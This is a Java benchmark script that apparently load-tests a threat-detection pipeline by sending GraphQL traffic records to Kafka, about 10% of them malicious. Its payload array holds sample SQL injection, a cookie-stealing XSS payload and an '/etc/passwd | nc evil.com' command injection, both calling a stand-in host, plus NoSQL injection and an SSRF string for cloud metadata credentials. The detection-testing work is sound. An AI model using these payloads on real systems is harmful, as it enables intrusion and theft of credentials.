package com.akto.threat.detection.scripts;

import com.akto.threat.detection.kafka.KafkaProtoProducer;
import com.akto.kafka.KafkaConfig;
import com.akto.kafka.KafkaConsumerConfig;
import com.akto.kafka.KafkaProducerConfig;
import com.akto.kafka.Serializer;
import com.akto.proto.http_response_param.v1.StringList;
import com.akto.proto.http_response_param.v1.HttpResponseParam;

import java.util.Map;
import java.util.Random;
import java.util.HashMap;

/**
 * GraphQL traffic benchmark — 10% malicious, 90% normal.
 * ~20KB total payload per record (request body + response body).
 *
 * Usage: run main()
 */
public class GraphQLTrafficBenchmark {

    public static long numRecords = 10000000L;

    public static final String THREAT_TOPIC = "akto.api.logs2";
    public static final String KAFKA_URL = "localhost:29092";
    private static final String CONSUMER_GROUP_ID = "akto.threat_detection";
    private static final Random random = new Random(42);

    private static final KafkaConfig kafkaConfig =
        KafkaConfig.newBuilder()
            .setGroupId(CONSUMER_GROUP_ID)
            .setBootstrapServers(KAFKA_URL)
            .setConsumerConfig(
                KafkaConsumerConfig.newBuilder()
                    .setMaxPollRecords(500)
                    .setPollDurationMilli(100)
                    .build())
            .setProducerConfig(
                KafkaProducerConfig.newBuilder().setBatchSize(16384).setLingerMs(100).build())
            .setKeySerializer(Serializer.STRING)
            .setValueSerializer(Serializer.BYTE_ARRAY)
            .build();

    private static final KafkaProtoProducer producer = new KafkaProtoProducer(kafkaConfig);

    private static final String[] CLEAN_IPS = {
        "203.45.167.23", "91.102.34.56", "172.217.14.206", "52.84.23.101",
        "185.60.219.11", "104.16.132.229", "45.33.32.156", "198.51.100.42"
    };

    // ~10KB request body — GraphQL query padded with realistic nested variables
    private static final String GRAPHQL_BODY;
    static {
        StringBuilder sb = new StringBuilder();
        sb.append("{\"operationName\":\"UserStatus\",\"variables\":{\"filters\":[");
        for (int i = 0; i < 80; i++) {
            if (i > 0) sb.append(",");
            sb.append(String.format(
                "{\"field\":\"account_%03d\",\"operator\":\"eq\",\"value\":\"val_%03d_%s\"}",
                i, i, "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrst"));
        }
        sb.append("]},\"query\":\"query UserStatus { userStatus { __typename verifiedAt age } }\"}");
        GRAPHQL_BODY = sb.toString();
    }

    // ~10KB response body — base GraphQL response padded with realistic nested JSON data
    private static final String RESPONSE_BODY;
    static {
        StringBuilder sb = new StringBuilder();
        sb.append("{\"data\":{\"userStatus\":{\"__typename\":\"UserStatus\",\"verifiedAt\":\"2026-04-03T01:11:17-07:00\",\"age\":60},\"transactions\":[");
        for (int i = 0; i < 80; i++) {
            if (i > 0) sb.append(",");
            sb.append(String.format(
                "{\"id\":\"%06d\",\"amount\":%.2f,\"currency\":\"USD\",\"description\":\"Transaction item %d for account processing\",\"status\":\"completed\",\"createdAt\":\"2026-04-0%dT10:%02d:00Z\"}",
                i, 10.0 + (i % 100), i, (i % 9) + 1, i % 60));
        }
        sb.append("]},\"extensions\":{}}");
        RESPONSE_BODY = sb.toString();
    }

    // Malicious payloads — 10% of traffic will use one of these
    private static final String[] MALICIOUS_BODIES = {
        // SQLi in GraphQL query variable
        "{\"operationName\":\"GetUser\",\"variables\":{\"id\":\"1' OR 1=1; DROP TABLE users; --\"},\"query\":\"query GetUser($id: ID!) { user(id: $id) { name email } }\"}",
        // XSS in GraphQL variable
        "{\"operationName\":\"UpdateProfile\",\"variables\":{\"name\":\"<script>document.location='http://evil.com/steal?c='+document.cookie</script>\"},\"query\":\"mutation UpdateProfile($name: String!) { updateProfile(name: $name) { success } }\"}",
        // NoSQL injection in variable
        "{\"operationName\":\"FindUser\",\"variables\":{\"filter\":{\"$gt\":\"\",\"$ne\":null}},\"query\":\"query FindUser($filter: JSON!) { findUser(filter: $filter) { id name } }\"}",
        // OS command injection in variable
        "{\"operationName\":\"Search\",\"variables\":{\"term\":\"; cat /etc/passwd | nc evil.com 4444\"},\"query\":\"query Search($term: String!) { search(term: $term) { results } }\"}",
        // SSRF in variable
        "{\"operationName\":\"FetchPreview\",\"variables\":{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"},\"query\":\"query FetchPreview($url: String!) { fetchPreview(url: $url) { title } }\"}",
    };

    public static void main(String[] args) throws Exception {
        runMixedTraffic();
    }

    private static void runMixedTraffic() throws Exception {
        System.out.println("\n******* Mixed Traffic — 10% malicious, 90% normal (~20KB per record) *******\n");
        System.out.printf("Request body size: %d bytes (%.1f KB)%n", GRAPHQL_BODY.length(), GRAPHQL_BODY.length() / 1024.0);
        System.out.printf("Response body size: %d bytes (%.1f KB)%n", RESPONSE_BODY.length(), RESPONSE_BODY.length() / 1024.0);
        System.out.printf("Total body: %.1f KB%n%n", (GRAPHQL_BODY.length() + RESPONSE_BODY.length()) / 1024.0);

        int maliciousCount = 0;
        int normalCount = 0;

        for (long i = 0; i < numRecords; i++) {
            boolean isMalicious = random.nextDouble() < 0.10;
            String ip = CLEAN_IPS[random.nextInt(CLEAN_IPS.length)];
            HttpResponseParam record;

            if (isMalicious) {
                String payload = MALICIOUS_BODIES[random.nextInt(MALICIOUS_BODIES.length)];
                record = buildGraphQLRecord(ip, payload);
                maliciousCount++;
            } else {
                record = buildGraphQLRecord(ip, GRAPHQL_BODY);
                normalCount++;
            }

            producer.send(THREAT_TOPIC, record);

            if ((i + 1) % 100 == 0) {
                System.out.printf("Sent %d/%d (malicious: %d, normal: %d)%n",
                    i + 1, numRecords, maliciousCount, normalCount);
            }
        }

        System.out.printf("%nDone. Total: %d, Malicious: %d (%.1f%%), Normal: %d (%.1f%%)%n",
            numRecords, maliciousCount, (maliciousCount * 100.0 / numRecords),
            normalCount, (normalCount * 100.0 / numRecords));
        System.out.println("Waiting 10s for consumer to process...");
        Thread.sleep(10000);
    }

    private static HttpResponseParam buildGraphQLRecord(String ip, String body) {
        Map<String, StringList> reqHeaders = new HashMap<>();
        reqHeaders.put("x-datadog-sampling-priority", sl("1"));
        reqHeaders.put("x-b3-sampled", sl("1"));
        reqHeaders.put("x-client-app", sl("web-app"));
        reqHeaders.put("x-forwarded-port", sl("443"));
        reqHeaders.put("x-client-os", sl("Mac OS"));
        reqHeaders.put("x-client-browser-version", sl("89"));
        reqHeaders.put("x-datadog-parent-id", sl("6423993135417589567"));
        reqHeaders.put("host", sl("graphql.acorns.com"));
        reqHeaders.put("content-type", sl("application/json"));
        reqHeaders.put("x-client-hardware", sl("undefined"));
        reqHeaders.put("auth-strategy", sl("jwt"));
        reqHeaders.put("x-request-id", sl("dda6b67a-675b-9700-bc14-ca183c1c2d51"));
        reqHeaders.put("x-client-browser", sl("Firefox"));
        reqHeaders.put("x-forwarded-proto", sl("https"));
        reqHeaders.put("x-client-build", sl(": undefined"));
        reqHeaders.put("x-datadog-trace-id", sl("6423993135417589567"));
        reqHeaders.put("x-forwarded-for", sl(ip));
        reqHeaders.put("x-amzn-trace-id", sl("Root=1-69e1cee5-4767dda3019acd980bc4a2d1"));
        reqHeaders.put("x-client-platform", sl("web"));
        reqHeaders.put("x-b3-traceid", sl("5d5a17d9f91393f604f761a280de1c9c"));
        reqHeaders.put("x-b3-spanid", sl("a327b28a0c251a85"));
        reqHeaders.put("traceparent", sl("00-5d5a17d9f91393f604f761a280de1c9c-a327b28a0c251a85-01"));
        reqHeaders.put("x-envoy-expected-rq-timeout-ms", sl("15000"));
        reqHeaders.put("user-agent", sl("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"));

        Map<String, StringList> respHeaders = new HashMap<>();
        respHeaders.put("content-type", sl("application/json; charset=utf-8"));
        respHeaders.put("cache-control", sl("no-cache, no-store, must-revalidate"));

        return HttpResponseParam.newBuilder()
            .setMethod("POST")
            .setPath("/graphql")
            .setType("HTTP/1.1")
            .putAllRequestHeaders(reqHeaders)
            .putAllResponseHeaders(respHeaders)
            .setRequestPayload(body)
            .setResponsePayload(RESPONSE_BODY)
            .setApiCollectionId(0)
            .setStatusCode(200)
            .setStatus("OK")
            .setTime((int) (System.currentTimeMillis() / 1000))
            .setAktoAccountId("1000000")
            .setIp(ip)
            .setDestIp(ip)
            .setDirection("INBOUND")
            .setIsPending(false)
            .setSource("MIRRORING")
            .setAktoVxlanId("0")
            .build();
    }

    private static StringList sl(String value) {
        return StringList.newBuilder().addValues(value).build();
    }
}
